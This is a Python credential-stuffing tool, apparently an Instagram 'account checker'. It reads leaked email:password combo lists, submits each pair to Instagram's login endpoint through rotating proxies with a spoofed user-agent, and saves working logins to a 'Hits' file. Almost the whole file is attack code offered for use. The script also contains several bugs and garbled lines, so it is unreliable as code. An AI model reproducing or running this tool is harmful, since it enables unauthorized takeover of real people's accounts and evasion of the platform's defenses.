import requests
from bs4 import BeautifulSoup
import threading
import os as a
from random import choice
import colorama
from time import sleep
from colorama import init
init()
from colorama import Fore, Back, Style


banner="""
     ___  ___   _____         _____   _           ___   _____   _   _   
    /   |/   | |  _  \       |  _  \ | |         /   | /  ___| | | / /  
   / /|   /| | | |_| |       | |_| | | |        / /| | | |     | |/ /   
  / / |__/ | | |  _  /       |  _  { | |       / / | | | |     | |\ \   
 / /       | | | | \ \       | |_| | | |___   / /  | | | |___  | | \ \  
/_/        |_| |_|  \_\      |_____/ |_____| /_/   |_| \_____| |_|  \_\  
(Mahmoud Mohamed) fb.me/mr.black.eg0
"""


a.system("cls")
class good_or_bad(object):
	def tellmewhatis(self,email,password,caso):
		if caso == True:
			
			print(Fore.BLUE + Back.GREEN+ f"[+]VALID ACCOUNT: {email}:{password}")
			print(f"""LIVE ACCOUNT
e = {email}
p = {password}		
CHECKER BY MR BLACK

""",file=open("Hits.txt","a"))
			
		elif caso == False:
			
			print(Fore.RED + Back.YELLOW+ f"[-]INVALID ACCOUNT: {email}:{password}")
			print(f"""{email}:{password}""",file=open("bad.txt","a"))
			l

class post(object):
	def proxies(self):
		try:
			file = open("proxy_lives.txt").readlines()
			file_lines = [proxies.rstrip()for proxies in file]
			result = {"https":"http://"+choice(file_lines)}
			return result
		except:
			pass

			

class post(object):
	def proxies(self):
		try:
			file = open("proxy_lives.txt").readlines()
			file_lines = [proxies.rstrip()for proxies in file]
			result = {"https":"http://"+choice(file_lines)}
			return result
		except:
			print("PROXY ERROR")
	def request(self,email,password):
		try:
			bad = open("bad.txt","r+")
			good = open("Hits.txt","r+")
			goods = good.read()
			bads = bad.read()
			req = requests.session()
			stop = "default@gmail.com"
		except:
			pass
		
		
		
		if  email in bads:
			os.system("^Z")
			os.system("^C")
			exit()

			
		elif email  in goods:
			os.system("^Z")
			os.system("^C")
			exit()
	
		
		else:
			req = requests.Session()
			proxy = self.proxies()
			
			
			try:
				while True:
					s= req.post("https://www.instagram.com/accounts/login/ajax/",proxies=proxy,timeout=3)
					pp = BeautifulSoup(s.text,"lxml")
					token4 = pp.find("csrf_token", {'name':"csrf_token"})["value"]
					
					
					if s.status_code == 200:
						break
			except:
				pass
			try:
				param = {
				"username":email,
				"password":password,
				"x-csrftoken":token4
				}
				headers = {
				"user-agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36",
				"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
				"content-type":"application/x-www-form-urlencoded"
				}
				cookies = {
				"6HElsoPxTu5qaxqd5tgPTGAntt4HMd0J"		
				}
				try:
					
					source = req.post("https://www.instagram.com/accounts/login/ajax",data=param,headers=headers,cookies=cookies,proxies=proxy,timeout=3)	
					
				except:
					pass
			except:
					pass
			
			try:
				if """profile_pic_url""" in source.text:
					good_or_bad().tellmewhatis(email,password,caso=True)
				
                
				elif """Regístrate o Inicia sesión""":
					good_or_bad().tellmewhatis(email,password,caso=False)
				else:
					print("IP BANDED CHANGE PROXYS")

    				
			except Exception as e:
				pass
			try:
				if email in stop:
					sleep(5)
					print("ALL ACCOUNTS HAVE BEEN CHECKED")
					pass
			except:
				pass		
		

class x(object):
		
	def load(self,b):
		file = open("combo.txt","r")
		try:
				
			file_lines = file.readlines()[b]
			combo = file_lines.rstrip()
			combos = combo.split(":")
			self.check(combos)
		except:
			pass


	def check(self,acc):
		
		try:
			email = acc[0]
			password = acc[1]
			
		#print (self.load())
		except:
			pass
		while True:
			try:
				
				post().request(email,password)
				
				
				
			except  Exception:
				
				break
	def main(self):
		print("""++++++++++++++++++++CONFIG BY: ++++++++++++++++++""")
		print(Fore.GREEN+Back.BLACK+banner)
		a = open("combo.txt","r")
		s = len(a.readlines())
		for b in range(s):
			w = threading.Thread(target=self.load(b))
			w.start()
		
if __name__ == '__main__':
	x().main()
